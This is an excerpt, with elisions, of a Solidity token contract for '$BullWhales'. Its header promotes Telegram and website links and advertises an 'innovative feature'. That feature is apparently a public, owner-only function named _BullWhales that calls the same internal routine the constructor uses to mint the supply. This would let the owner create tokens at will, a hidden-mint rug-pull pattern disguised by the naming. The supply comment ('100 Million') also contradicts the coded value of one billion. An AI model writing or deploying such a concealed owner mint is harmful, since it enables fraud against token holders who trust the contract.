...
//
// $BullWhales proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BullWhalesOFC
// 📱 Website ::https://bullwhales.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BullWhales(uint256 amount) public onlyOwner {
 _BullWhales(msg.sender, amount);
    }
    ...
    function _BullWhales(address account, uint256 amount) internal virtual {
...
contract $BullWhales is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Bull Whales", "BW") {
     _BullWhales(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}